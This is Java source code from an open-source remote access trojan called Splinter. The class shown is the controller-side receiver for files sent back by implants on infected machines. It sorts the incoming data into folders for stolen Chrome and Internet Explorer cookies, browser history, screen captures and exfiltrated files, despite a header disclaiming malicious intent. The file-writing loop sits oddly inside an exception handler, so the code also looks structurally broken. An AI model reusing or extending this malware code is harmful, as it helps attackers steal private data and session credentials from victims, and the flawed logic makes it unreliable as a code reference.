/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Implant.FTP;

import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_TextDisplayPane;
import Implant.Driver;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileOutputStream;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;

public class FTP_Thread_Receiver extends Thread
  implements Runnable
{
  static String strMyClassName = "FTP_Thread_Receiver";

  String strConnectionTimeStamp = "UNKNOWN";
  String strReadStartTime = "UNKNOWN";
  String strReadStopTime = "UNKNOWN";
  String strIPAddress = "";
  int hostPort = 0;

  long beginFileTransferTime = 1L;
  long endFileTransferTime = 1L;

  int readBufferSize = 20480;

  long bytesReadFromSocket = 0L;

  DataInputStream dis_SktConnection = null;
  DataOutputStream dos_SktConnection = null;
  FileOutputStream fos_ReceivedFile = null;

  byte[] arrReceiveFile_ByteArray = null;
  int bytesReadFromBuffer = 0;
  long totalBytesRead = 0L;

  BufferedOutputStream brOutFile = null;
  FileOutputStream fos_OutFile = null;

  boolean receiveFile = false;

  Socket sktConnection = null;
  boolean i_am_implant_daemon = false;
  boolean i_am_controller_daemon = false;

  String implantTyp = "";
  String fileName = "";
  String fileSze = "";

  int implantType = 0;
  long fileSize = 0L;

  File mySavePath = null;

  boolean savingSpecialType = false;
  boolean savingScreenCapture = false;
  boolean savingCookies_Chrome = false;
  boolean savingCookies_InternetExplorer = false;
  boolean savingBrowserHistory_Chrome = false;
  boolean savingBrowserHistory_InternetExplorer = false;
  boolean savingOrbitingPayload_ExfiltratedFiles = false;
  boolean savingDataExfilPayload_ExfiltratedFiles = false;

  public FTP_Thread_Receiver(boolean im_implant_daemon, boolean im_controller_daemon, Socket skt)
  {
    this.sktConnection = skt;
    this.i_am_implant_daemon = im_implant_daemon;
    this.i_am_controller_daemon = im_controller_daemon;
  }

  public void run()
  {
    try
    {
      Drivers.sop("Connection Established to receive this FTP File on: " + this.sktConnection.getInetAddress() + " : " + this.sktConnection.getPort());

      this.strIPAddress = ""+this.sktConnection.getInetAddress();
      this.hostPort = this.sktConnection.getLocalPort();
      if (this.hostPort < 0) {
        this.hostPort = 80;
      }
      String prev = this.strIPAddress;
      try
      {
        this.strIPAddress = this.strIPAddress.replace("/", "");

        prev = this.strIPAddress;

        this.strIPAddress = this.strIPAddress.replace("\\", ""); } catch (Exception e) {
        this.strIPAddress = prev;
      }
      receiveFile();
    }
    catch (Exception e)
    {
      Drivers.eop("run", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    try
    {
      Drivers.sop("Closing Receiving streams for IP: " + this.strIPAddress);

      if (this.dis_SktConnection != null) {
        this.dis_SktConnection.close();
      }
      if (this.dos_SktConnection != null) {
        this.dos_SktConnection.close();
      }
      if (this.fos_ReceivedFile != null) {
        this.fos_ReceivedFile.close();
      }
      if ((this.sktConnection != null) && (this.sktConnection.isConnected())) {
        this.sktConnection.close();
      }

    }
    catch (Exception localException1)
    {
    }

    try
    {
      if ((Driver.alConnectedFTPClients != null) && (Driver.alConnectedFTPClients.contains(this)))
      {
        Driver.alConnectedFTPClients.remove(this);
      }
    }
    catch (Exception localException2)
    {
    }
  }

  public boolean receiveFile()
  {
    try {
      this.beginFileTransferTime = System.currentTimeMillis();
      this.strReadStartTime = Drivers.getTimeStamp_Without_Date();

      Drivers.sp("Attempting to open streams on this socket...");

      this.dis_SktConnection = new DataInputStream(this.sktConnection.getInputStream());
      this.dos_SktConnection = new DataOutputStream(this.sktConnection.getOutputStream());

      Drivers.sop("Streams opened.  Proceeding with handshake...");

      String strHandshake = this.dis_SktConnection.readUTF();

      if (strHandshake == null)
      {
        throw new SocketException("Null line received");
      }

      String[] arrHandShake = strHandshake.split("%%%%%");

      if (arrHandShake.length == 4)
      {
        this.implantTyp = arrHandShake[0];
        this.fileName = arrHandShake[1];
        this.fileSze = arrHandShake[2];

        if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_ORDINARY)))
        {
          this.savingSpecialType = false;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES)))
        {
          this.savingSpecialType = true;
          this.savingScreenCapture = true;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_COOKIES_INTERNET_EXPLORER)))
        {
          this.savingSpecialType = true;
          this.savingCookies_InternetExplorer = true;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_COOKIES_CHROME)))
        {
          this.savingSpecialType = true;
          this.savingCookies_Chrome = true;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_BROWSER_HISTORY_INTERNET_EXPLORER)))
        {
          this.savingSpecialType = true;
          this.savingBrowserHistory_InternetExplorer = true;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_BROWSER_HISTORY_CHROME)))
        {
          this.savingSpecialType = true;
          this.savingBrowserHistory_Chrome = true;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_ORBITER_PAYLOAD)))
        {
          this.savingSpecialType = true;
          this.savingOrbitingPayload_ExfiltratedFiles = true;
        }
        else if ((arrHandShake[3] != null) && (arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_DATA_EXFIL)))
        {
          this.savingSpecialType = true;
          this.savingDataExfilPayload_ExfiltratedFiles = true;
        }

      }
      else if (arrHandShake.length == 3)
      {
        this.implantTyp = arrHandShake[0];
        this.fileName = arrHandShake[1];
        this.fileSze = arrHandShake[2];
      }
      else
      {
        throw new NumberFormatException("Invalid parameters received from " + this.strIPAddress + " Closing the Streams...");
      }

      try
      {
        this.implantType = Integer.parseInt(this.implantTyp);
        this.fileSize = Long.parseLong(this.fileSze);
        if ((this.fileName == null) || (this.fileName.trim().equals("")))
        {
          throw new NumberFormatException("Invalid File Name received");
        }

      }
      catch (Exception e)
      {
        throw new NumberFormatException(e.getLocalizedMessage());
      }

      String abbreviatedFileSize = Driver.getFormattedFileSize_String(this.fileSize);

      if (!Driver.autoAcceptFTP_Files)
      {
        if (this.i_am_controller_daemon)
        {
          String Notification = "* * * New File Received * * *\nConnection IP: " + 
            this.sktConnection.getInetAddress() + " : " + this.sktConnection.getLocalPort() + 
            "\nFile Name: " + this.fileName + 
            "\nFile Size: " + abbreviatedFileSize + 
            "\n\nDo you wish to Accept this File?";

          if (Drivers.jop_Confirm(Notification, "Download File") != 0)
          {
            Drivers.sop("User chose not to accept file: " + this.fileName + " from " + this.sktConnection.getInetAddress() + ". Closing streams...");
            return false;
          }

          this.receiveFile = true;

          if ((Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()))
          {
            Driver.jop("Unable to save file.  FTP DropBox is incorrect");
            return false;
          }

        }

      }
      else
      {
        this.receiveFile = true;
      }

      if (this.receiveFile)
      {
        this.dos_SktConnection.writeUTF("PROCEED");
        this.dos_SktConnection.flush();

        this.fileName = (System.currentTimeMillis() + "_" + this.fileName);
        try
        {
          if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
            this.mySavePath = new File(Driver.fleFTP_DropBoxDirectory.getCanonicalPath() + this.strIPAddress + "_" + this.hostPort);
          else {
            this.mySavePath = new File(Driver.fleFTP_DropBoxDirectory.getCanonicalPath() + Driver.fileSeperator + this.strIPAddress + "_" + this.hostPort);
          }

          boolean directoryExists = true;
          if ((!this.mySavePath.exists()) && (!this.mySavePath.isDirectory()))
          {
            directoryExists = this.mySavePath.mkdir();
          }

          if (!directoryExists)
          {
            throw new Exception("Could not create directory!!! in " + strMyClassName);
          }

          if ((directoryExists) && (this.savingSpecialType))
          {
            if (this.savingScreenCapture)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "SCREEN CAPTURE");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "SCREEN CAPTURE");
              }

            }
            else if (this.savingCookies_Chrome)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "Chrome_Cookies");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "Chrome_Cookies");
              }

            }
            else if (this.savingCookies_InternetExplorer)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "IE_Cookies");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "IE_Cookies");
              }

            }
            else if (this.savingBrowserHistory_Chrome)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "Chrome_History");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "Chrome_History");
              }

            }
            else if (this.savingBrowserHistory_InternetExplorer)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "IE_History");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "IE_History");
              }

            }
            else if (this.savingOrbitingPayload_ExfiltratedFiles)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "ORBITER PAYLOAD");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "ORBITER PAYLOAD");
              }

            }
            else if (this.savingDataExfilPayload_ExfiltratedFiles)
            {
              if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "DATA EXFIL");
              else {
                this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "DATA EXFIL");
              }

            }

            if ((!this.mySavePath.exists()) || (!this.mySavePath.isDirectory()))
            {
              directoryExists = this.mySavePath.mkdir();
            }

            if (!directoryExists)
            {
              throw new Exception("Could not create directory!!! in " + strMyClassName);
            }

          }

        }
        catch (Exception e)
        {
          Driver.sop("Error Trying to create directory. Reverting to path: " + Driver.fleFTP_DropBoxDirectory.getCanonicalPath());
          this.mySavePath = Driver.fleFTP_DropBoxDirectory;

          Drivers.sop("Attempting to save File \"" + this.fileName + "\" at location: " + this.mySavePath);

          String myOutFilePath = "";

          if (this.mySavePath.getCanonicalPath().endsWith(Driver.fileSeperator))
            myOutFilePath = Driver.fleFTP_DropBoxDirectory.getCanonicalPath() + this.fileName;
          else {
            myOutFilePath = this.mySavePath.getCanonicalPath() + Driver.fileSeperator + this.fileName;
          }
          Drivers.sop("Attempting to create file: " + myOutFilePath);

          this.fos_ReceivedFile = new FileOutputStream(myOutFilePath);

          Drivers.sop("Looks like file creation was successful. initializing buffer arrays");

          this.arrReceiveFile_ByteArray = new byte[this.readBufferSize];
          this.totalBytesRead = 0L;

          while (((this.bytesReadFromBuffer = this.dis_SktConnection.read(this.arrReceiveFile_ByteArray, 0, this.readBufferSize)) > 0) && (!this.sktConnection.isClosed()))
          {
            this.fos_ReceivedFile.write(this.arrReceiveFile_ByteArray, 0, this.bytesReadFromBuffer);
            this.fos_ReceivedFile.flush();

            if (this.bytesReadFromBuffer >= 0) {
              this.totalBytesRead += this.bytesReadFromBuffer;
            }
          }

          if (this.i_am_controller_daemon)
          {
            Drivers.sop("File writing complete. Closing streams...Total Bytes written: " + Driver.getFormattedFileSize_String(this.totalBytesRead) + " out of expected: " + Driver.getFormattedFileSize_String(this.fileSze));

            Drivers.txtpne_broadcastMessageBoard.appendStatusMessageString(true, "File received from: " + this.sktConnection.getInetAddress() + " saved at location: " + myOutFilePath);
          }
          else
          {
            Drivers.sop("File writing complete. Closing streams...Total Bytes written: " + Driver.getFormattedFileSize_String(this.totalBytesRead) + " out of expected: " + this.fileSze);
          }

          this.endFileTransferTime = System.currentTimeMillis();
        }
      }

      return true;
    }
    catch (EOFException eof)
    {
      Drivers.sop("Unable to complete action with implant at " + this.strIPAddress + " the socket has been closed");
    }
    catch (ArrayIndexOutOfBoundsException aob)
    {
      Drivers.sop("Invalid parameters received from " + this.strIPAddress + " Closing the Streams...");
    }
    catch (NumberFormatException nfe)
    {
      Drivers.sop("Invalid parameters received from " + this.strIPAddress + " Closing the Streams...");
    }
    catch (SocketException se)
    {
      Drivers.sop("Unable to complete action with implant at " + this.strIPAddress + " the socket has been closed");
    }
    catch (Exception e)
    {
      Drivers.eop("receiveFile", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}